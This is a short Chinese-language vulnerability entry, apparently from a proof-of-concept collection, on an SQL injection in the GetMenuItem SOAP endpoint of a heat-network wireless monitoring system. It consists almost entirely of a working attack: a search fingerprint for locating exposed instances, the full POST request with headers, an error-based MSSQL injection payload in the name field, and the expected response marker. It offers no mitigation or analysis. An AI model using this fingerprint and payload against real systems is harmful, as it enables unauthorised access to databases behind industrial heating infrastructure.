# 热网无线监测系统GetMenuItem存在SQL注入漏洞

- **系统**：热网无线监测系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="Downloads/HDPrintInstall.rar"`
- **请求**：`POST /DataSrvs/UCCGSrv.asmx HTTP/1.1`
- **关键头**：`Cookie: ASP.NET_SessionId=etxlbzrbmcecvsuy1fwjnfzy`　`Priority: u=1`　`SOAPAction: [http://tempuri.org/GetMenuItem](http://tempuri.org/GetMenuItem)`　`Content-Type: text/xml;charset=UTF-8`　`Content-Length: 498`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
<soapenv:Header/>
<soapenv:Body>
<tem:GetMenuItem>
<!--type: string-->
<tem:name>gero et') AND 1829 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (1829=1829) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(106)+CHAR(107)+CHAR(113)))-- UwEA</tem:name>
</tem:GetMenuItem>
</soapenv:Body>
</soapenv:Envelope>
```
- **预期**：500　|　qjbpq1qzjkq